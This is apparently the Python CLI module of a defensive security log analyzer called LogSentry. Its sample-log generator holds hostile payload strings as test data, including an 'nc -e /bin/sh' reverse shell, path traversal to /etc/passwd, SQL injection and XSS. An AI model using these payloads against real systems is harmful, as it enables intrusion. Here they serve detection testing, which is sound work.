"""
Command-line interface for LogSentry
"""

import click
import os
import sys
from typing import Optional
from datetime import datetime
import json

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.syntax import Syntax
from rich.text import Text

from .analyzer import LogAnalyzer, AnalysisResult, merge_analysis_results
from .rules import Severity, SecurityRules
from .utils import format_bytes


console = Console()


@click.group()
@click.version_option(version="1.0.0")
def cli():
    """LogSentry - A CLI Security Log Analyzer
    
    Analyze log files for security threats and suspicious activities.
    """
    pass


@cli.command()
@click.argument('log_file', type=click.Path(exists=True))
@click.option('--output', '-o', help='Output file for results')
@click.option('--format', '-f', 'output_format', 
              type=click.Choice(['json', 'csv', 'console'], case_sensitive=False),
              default='console', help='Output format')
@click.option('--severity', '-s', 
              type=click.Choice(['low', 'medium', 'high', 'critical'], case_sensitive=False),
              help='Filter by minimum severity level')
@click.option('--category', '-c', help='Filter by threat category')
@click.option('--max-lines', type=int, help='Maximum lines to analyze')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
@click.option('--no-color', is_flag=True, help='Disable colored output')
def analyze(log_file: str, output: Optional[str], output_format: str, 
           severity: Optional[str], category: Optional[str], 
           max_lines: Optional[int], verbose: bool, no_color: bool):
    """Analyze a single log file for security threats."""
    
    if no_color:
        console._color_system = None
    
    try:
        console.print(f"[bold blue]LogSentry Security Analyzer[/bold blue]")
        console.print(f"Analyzing: {log_file}")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console,
            transient=True
        ) as progress:
            task = progress.add_task("Analyzing log file...", total=None)
            
            analyzer = LogAnalyzer()
            result = analyzer.analyze_file(log_file, max_lines)
            
            progress.update(task, description="Processing results...")
        
        # Filter results if requested
        filtered_result = _filter_result(result, severity, category)
        
        # Output results
        if output_format == 'console':
            _display_console_results(filtered_result, verbose)
        elif output:
            analyzer.export_results(filtered_result, output, output_format)
            console.print(f"[green]Results exported to {output}[/green]")
        else:
            console.print("[red]Error: Output file required for non-console formats[/red]")
            sys.exit(1)
            
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")
        sys.exit(1)


@cli.command()
@click.argument('directory', type=click.Path(exists=True, file_okay=False))
@click.option('--pattern', '-p', default='*.log', help='File pattern to match')
@click.option('--output', '-o', help='Output file for merged results')
@click.option('--format', '-f', 'output_format',
              type=click.Choice(['json', 'csv'], case_sensitive=False),
              default='json', help='Output format')
@click.option('--severity', '-s',
              type=click.Choice(['low', 'medium', 'high', 'critical'], case_sensitive=False),
              help='Filter by minimum severity level')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
def scan(directory: str, pattern: str, output: Optional[str], output_format: str,
         severity: Optional[str], verbose: bool):
    """Scan a directory for log files and analyze them."""
    
    try:
        console.print(f"[bold blue]LogSentry Directory Scan[/bold blue]")
        console.print(f"Scanning directory: {directory}")
        console.print(f"File pattern: {pattern}")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console,
            transient=True
        ) as progress:
            task = progress.add_task("Scanning directory...", total=None)
            
            analyzer = LogAnalyzer()
            results = analyzer.analyze_directory(directory, pattern)
            
            progress.update(task, description="Merging results...")
        
        if not results:
            console.print("[yellow]No log files found or analyzed[/yellow]")
            return
        
        # Merge results
        merged = merge_analysis_results(results)
        
        # Display summary
        _display_scan_summary(results, merged, verbose)
        
        # Export if requested
        if output:
            with open(output, 'w') as f:
                json.dump(merged, f, indent=2, default=str)
            console.print(f"[green]Merged results exported to {output}[/green]")
        
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")
        sys.exit(1)


@cli.command()
@click.option('--output', '-o', default='sample_logs.txt', help='Output file name')
@click.option('--count', '-c', default=100, help='Number of sample lines to generate')
@click.option('--include-attacks', is_flag=True, help='Include sample attack patterns')
def generate_sample(output: str, count: int, include_attacks: bool):
    """Generate sample log data for testing."""
    
    try:
        _generate_sample_logs(output, count, include_attacks)
        console.print(f"[green]Sample log file generated: {output}[/green]")
        console.print(f"Generated {count} log lines")
        if include_attacks:
            console.print("[yellow]Included sample attack patterns for testing[/yellow]")
            
    except Exception as e:
        console.print(f"[red]Error generating sample logs: {str(e)}[/red]")
        sys.exit(1)


@cli.command()
def list_rules():
    """List all available security detection rules."""
    
    rules = SecurityRules()
    
    console.print("[bold blue]LogSentry Security Rules[/bold blue]\n")
    
    # Group rules by category
    by_category = {}
    for rule in rules.rules:
        if rule.category not in by_category:
            by_category[rule.category] = []
        by_category[rule.category].append(rule)
    
    for category, category_rules in by_category.items():
        table = Table(title=f"Category: {category.replace('_', ' ').title()}")
        table.add_column("Rule Name", style="cyan")
        table.add_column("Severity", style="bold")
        table.add_column("Description")
        table.add_column("Tags", style="dim")
        
        for rule in category_rules:
            severity_color = {
                Severity.LOW: "green",
                Severity.MEDIUM: "yellow", 
                Severity.HIGH: "orange1",
                Severity.CRITICAL: "red"
            }.get(rule.severity, "white")
            
            table.add_row(
                rule.name,
                f"[{severity_color}]{rule.severity.value}[/{severity_color}]",
                rule.description,
                ", ".join(rule.tags[:3])  # Show first 3 tags
            )
        
        console.print(table)
        console.print()


@cli.command()
@click.argument('text', type=str)
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
def test_rules(text: str, verbose: bool):
    """Test security rules against a text string."""
    
    try:
        from .rules import RuleEngine
        
        console.print(f"[bold blue]Testing Rules Against Text[/bold blue]")
        console.print(f"Input: {text}\n")
        
        rule_engine = RuleEngine()
        detections = rule_engine.analyze_line(text, 1)
        
        if detections:
            table = Table(title="Detected Threats")
            table.add_column("Rule", style="cyan")
            table.add_column("Severity", style="bold")
            table.add_column("Category")
            table.add_column("Description")
            table.add_column("Confidence", justify="right")
            
            for detection in detections:
                severity_color = {
                    Severity.LOW: "green",
                    Severity.MEDIUM: "yellow",
                    Severity.HIGH: "orange1", 
                    Severity.CRITICAL: "red"
                }.get(detection.severity, "white")
                
                table.add_row(
                    detection.rule_name,
                    f"[{severity_color}]{detection.severity.value}[/{severity_color}]",
                    detection.category,
                    detection.description,
                    f"{detection.confidence:.2f}"
                )
            
            console.print(table)
        else:
            console.print("[green]No threats detected[/green]")
            
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")
        sys.exit(1)


def _filter_result(result: AnalysisResult, severity: Optional[str], category: Optional[str]) -> AnalysisResult:
    """Filter analysis result based on criteria."""
    
    if not severity and not category:
        return result
    
    filtered_detections = result.detections.copy()
    
    if severity:
        severity_enum = Severity(severity.lower())
        severity_order = [Severity.LOW, Severity.MEDIUM, Severity.HIGH, Severity.CRITICAL]
        min_level = severity_order.index(severity_enum)
        
        filtered_detections = [
            d for d in filtered_detections 
            if severity_order.index(d.severity) >= min_level
        ]
    
    if category:
        filtered_detections = [
            d for d in filtered_detections 
            if d.category == category
        ]
    
    # Create new result with filtered detections
    result.detections = filtered_detections
    return result


def _display_console_results(result: AnalysisResult, verbose: bool):
    """Display results in console format."""
    
    # Summary panel
    summary_text = f"""
File: {result.file_path}
Total lines: {result.total_lines:,}
Parsed lines: {result.parsed_lines:,}
Analysis time: {result.analysis_time:.2f}s
Risk Score: {result.summary.get('risk_score', {}).get('score', 0)}/100 ({result.summary.get('risk_score', {}).get('level', 'unknown')})
    """
    
    console.print(Panel(summary_text.strip(), title="Analysis Summary", style="blue"))
    
    # Detection summary
    if result.detections:
        detection_summary = result.summary
        
        summary_table = Table(title="Detection Summary")
        summary_table.add_column("Metric", style="cyan")
        summary_table.add_column("Count", justify="right")
        
        summary_table.add_row("Total Detections", str(detection_summary.get('total', 0)))
        summary_table.add_row("Unique IPs", str(detection_summary.get('unique_ips', 0)))
        summary_table.add_row("Suspicious IPs", str(detection_summary.get('suspicious_ips', 0)))
        
        for severity, count in detection_summary.get('by_severity', {}).items():
            severity_color = {
                'low': 'green',
                'medium': 'yellow',
                'high': 'orange1',
                'critical': 'red'
            }.get(severity, 'white')
            summary_table.add_row(f"[{severity_color}]{severity.title()} Severity[/{severity_color}]", str(count))
        
        console.print(summary_table)
        
        # Top threats
        if detection_summary.get('top_threats'):
            threats_table = Table(title="Top Threats")
            threats_table.add_column("Rule", style="cyan")
            threats_table.add_column("Count", justify="right")
            threats_table.add_column("Severity", style="bold")
            
            for threat in detection_summary['top_threats'][:10]:
                severity_color = {
                    'low': 'green',
                    'medium': 'yellow',
                    'high': 'orange1',
                    'critical': 'red'
                }.get(threat['severity'], 'white')
                
                threats_table.add_row(
                    threat['rule'],
                    str(threat['count']),
                    f"[{severity_color}]{threat['severity']}[/{severity_color}]"
                )
            
            console.print(threats_table)
        
        # Detailed detections if verbose
        if verbose and result.detections:
            detections_table = Table(title="Detailed Detections")
            detections_table.add_column("Line", justify="right")
            detections_table.add_column("Rule", style="cyan")
            detections_table.add_column("Severity", style="bold")
            detections_table.add_column("Matched Text", max_width=50)
            detections_table.add_column("Confidence", justify="right")
            
            for detection in result.detections[:20]:  # Limit to first 20
                severity_color = {
                    Severity.LOW: 'green',
                    Severity.MEDIUM: 'yellow',
                    Severity.HIGH: 'orange1',
                    Severity.CRITICAL: 'red'
                }.get(detection.severity, 'white')
                
                detections_table.add_row(
                    str(detection.line_number),
                    detection.rule_name,
                    f"[{severity_color}]{detection.severity.value}[/{severity_color}]",
                    detection.matched_text[:47] + "..." if len(detection.matched_text) > 50 else detection.matched_text,
                    f"{detection.confidence:.2f}"
                )
            
            console.print(detections_table)
            if len(result.detections) > 20:
                console.print(f"[dim]... and {len(result.detections) - 20} more detections[/dim]")
    
    else:
        console.print("[green]No security threats detected![/green]")


def _display_scan_summary(results, merged, verbose: bool):
    """Display directory scan summary."""
    
    summary_text = f"""
Files analyzed: {len(results)}
Total lines: {merged['total_lines']:,}
Total detections: {merged['total_detections']:,}
Total analysis time: {merged['total_analysis_time']:.2f}s
    """
    
    console.print(Panel(summary_text.strip(), title="Scan Summary", style="blue"))
    
    if results:
        # File results table
        files_table = Table(title="File Analysis Results")
        files_table.add_column("File", style="cyan")
        files_table.add_column("Lines", justify="right")
        files_table.add_column("Detections", justify="right")
        files_table.add_column("Risk Level", style="bold")
        
        for result in results:
            risk_level = result.summary.get('risk_score', {}).get('level', 'unknown')
            risk_color = {
                'low': 'green',
                'medium': 'yellow', 
                'high': 'orange1',
                'critical': 'red'
            }.get(risk_level, 'white')
            
            files_table.add_row(
                os.path.basename(result.file_path),
                f"{result.total_lines:,}",
                str(len(result.detections)),
                f"[{risk_color}]{risk_level}[/{risk_color}]"
            )
        
        console.print(files_table)
        
        # Top threats across all files
        if merged['top_threats_across_files']:
            threats_table = Table(title="Top Threats Across All Files")
            threats_table.add_column("Threat Rule", style="cyan")
            threats_table.add_column("Total Occurrences", justify="right")
            
            for rule, count in merged['top_threats_across_files'].most_common(10):
                threats_table.add_row(rule, str(count))
            
            console.print(threats_table)


def _generate_sample_logs(output_file: str, count: int, include_attacks: bool):
    """Generate sample log data for testing."""
    
    import random
    from datetime import datetime, timedelta
    
    sample_ips = [
        "192.168.1.100", "10.0.0.50", "172.16.0.10",
        "203.0.113.42", "198.51.100.25", "93.184.216.34"
    ]
    
    normal_requests = [
        'GET /index.html HTTP/1.1',
        'GET /about.html HTTP/1.1', 
        'POST /login HTTP/1.1',
        'GET /images/logo.png HTTP/1.1',
        'GET /css/style.css HTTP/1.1'
    ]
    
    attack_patterns = [
        "GET /admin/config.php?file=../../../etc/passwd HTTP/1.1",
        "POST /login HTTP/1.1' OR 1=1--",
        "GET /search?q=<script>alert('xss')</script> HTTP/1.1",
        "GET /app?cmd=nc -e /bin/sh 192.168.1.1 4444 HTTP/1.1",
        "GET /wp-admin/ HTTP/1.1\" User-Agent: sqlmap/1.0",
        "multiple failed login attempts detected from 203.0.113.42",
        "privilege escalation attempt: sudo su - root"
    ]
    
    with open(output_file, 'w') as f:
        base_time = datetime.now() - timedelta(hours=24)
        
        for i in range(count):
            timestamp = base_time + timedelta(minutes=random.randint(0, 1440))
            ip = random.choice(sample_ips)
            
            if include_attacks and random.random() < 0.1:  # 10% attack patterns
                if random.random() < 0.5:
                    # Apache-style log with attack
                    request = random.choice(attack_patterns[:5])
                    status = random.choice([400, 403, 404, 500])
                    size = random.randint(200, 1000)
                    log_line = f'{ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{request}" {status} {size}'
                else:
                    # Syslog-style with attack
                    attack = random.choice(attack_patterns[5:])
                    log_line = f'{timestamp.strftime("%b %d %H:%M:%S")} server security: {attack}'
            else:
                # Normal request
                request = random.choice(normal_requests)
                status = random.choice([200, 304, 301, 404])
                size = random.randint(500, 5000)
                log_line = f'{ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{request}" {status} {size}'
            
            f.write(log_line + '\n')


if __name__ == '__main__':
    cli()